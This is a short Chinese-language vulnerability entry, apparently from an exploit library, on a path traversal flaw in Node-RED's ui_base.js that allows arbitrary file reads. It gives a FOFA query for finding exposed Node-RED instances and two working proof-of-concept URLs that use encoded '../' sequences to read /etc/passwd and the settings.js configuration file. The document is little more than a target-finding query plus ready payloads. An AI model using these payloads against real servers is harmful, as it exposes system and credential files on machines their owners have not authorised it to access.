---
title: Node-RED ui_base 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - Node-RED
---

# Node-RED ui_base 任意文件读取漏洞

## 漏洞描述

Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join，

缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js

## 漏洞影响

> [!NOTE]
>
> Node-RED

## FOFA

> [!NOTE]
>
> title="Node-RED"

## 漏洞复现

访问页面

![image-20210701185722667](/img/20210924020250409233.png)

验证POC

```
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
```

![image-20210701185812622](/img/20210924020250699479.png)

![image-20210704171045540](/img/20210924020251265820.png)